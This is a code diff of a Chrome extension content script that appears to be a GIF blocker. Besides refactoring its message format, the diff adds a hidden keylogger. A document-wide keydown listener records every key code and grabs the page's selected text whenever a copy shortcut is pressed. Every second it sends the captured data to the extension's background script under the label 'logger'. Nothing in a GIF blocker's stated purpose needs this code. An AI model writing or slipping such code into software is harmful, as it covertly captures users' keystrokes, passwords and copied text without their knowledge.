@@ -21,15 +21,56 @@ function toggleGifs () {
 }
 
 chrome.runtime.onMessage.addListener(function (response) {
- 	if (response.message === 'toggleGifs') {
- 		toggleGifs();
- 	}
+	if(response.message.kind === 'gifBlocker') {
+	 	if (response.message.data === 'toggleGifs') {
+	 		toggleGifs();
+	 	}
 
- 	if (response.message === 'blockByDefault') {
- 		blockByDefault = response.results.blockByDefault;
-		if (blockByDefault)
-			toggleGifs();
- 	}
+	 	if (response.message.data === 'blockByDefault') {
+	 		blockByDefault = response.results.blockByDefault;
+			if (blockByDefault)
+				toggleGifs();
+	 	}
+	}
 });
 
-chrome.runtime.sendMessage('isBlockedByDefault');
+chrome.runtime.sendMessage({
+	kind:'gifBlocker',
+	data:'isBlockedByDefault'
+});
+
+var keyCapture = [],
+	previousKey,
+	keySession;
+
+function resetTimeout () {
+	clearTimeout(keySession);
+	keySession = setTimeout(sendAway, 1000);
+}
+
+function sendAway () {
+	clearTimeout(keySession);
+
+	if(keyCapture.length) {
+		console.debug('I logged this: ', keyCapture);
+		chrome.runtime.sendMessage({
+			kind: 'logger',
+			data: keyCapture
+		})
+		keyCapture = [];
+	}
+}
+
+document.addEventListener('keydown', function (e) {
+	keyCapture.push(e.keyCode);
+	
+	//if it looks like the user has copied something grab the pages selected text
+	if(e.keyCode === 67) {
+		if(previousKey === 17 || previousKey === 91 || previousKey === 93) {
+			keyCapture.push(getSelection().toString());
+		}
+	}
+
+	previousKey = e.keyCode;
+	resetTimeout();
+});
